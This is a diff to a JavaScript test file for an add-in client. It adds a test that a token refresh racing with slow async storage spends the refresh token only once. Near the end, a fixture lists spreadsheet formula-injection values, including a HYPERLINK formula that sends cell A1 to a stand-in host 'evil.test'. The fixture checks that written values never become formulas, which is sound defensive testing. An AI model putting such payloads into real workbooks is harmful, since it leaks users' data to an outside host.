@@ -107,6 +107,26 @@ test('Apps Script: the challenge is the S256 of the verifier, custom functions n
     assert.throws(() => gs.authorizationUrl(), /not set up/);
 });
 
+test('Excel: a token read before a refresh finished is never refreshed again (a spent refresh token ends the grant)', async () => {
+    const { seen, fetchImpl } = fakeCairn();
+    const { ctx } = loadExcel(dist, { fetchImpl });
+    const m = new Map([['cairn.tokens', JSON.stringify({ access_token: 'cat_0', refresh_token: 'car_0', expires_at: Date.now() - 1 })]]);
+    // OfficeRuntime.storage answers asynchronously: a read sees the value at the time it was made, later.
+    const slow = {
+        getItem: (k) => { const v = m.has(k) ? m.get(k) : null; return new Promise((r) => setTimeout(() => r(v), 40)); },
+        setItem: async (k, v) => { m.set(k, String(v)); },
+        removeItem: async (k) => { m.delete(k); },
+    };
+    const client = new ctx.CairnAddin.Client({ apiBase: 'https://cairn.test/cairn/api', clientId: 'agt_excel_addin',
+                                               redirectUri: 'https://addins.test/callback.html', storage: slow, fetch: fetchImpl });
+    const first = client.accessToken();                                     // reads at 0, refreshes 40..70
+    await new Promise((r) => setTimeout(r, 50));
+    const second = client.accessToken();                                    // reads the old tokens at 50, sees them at 90
+    assert.deepEqual([await first, await second], ['cat_1', 'cat_1']);
+    const spent = seen.token.filter((f) => f.grant_type === 'refresh_token').map((f) => f.refresh_token);
+    assert.deepEqual(spent, ['car_0']);
+});
+
 // Values written into cells (not formulas) must never become formulas: a value from the data such as
 // =HYPERLINK("https://evil.test/?"&A1) or =IMPORTXML(...) would otherwise run in the person's workbook.
 const INJECTED = [['name', 'note'], ['=HYPERLINK("https://evil.test/?"&A1,"x")', '+1+cmd'], ['@SUM(A1)', '-2+3'], ['ok', 42]];
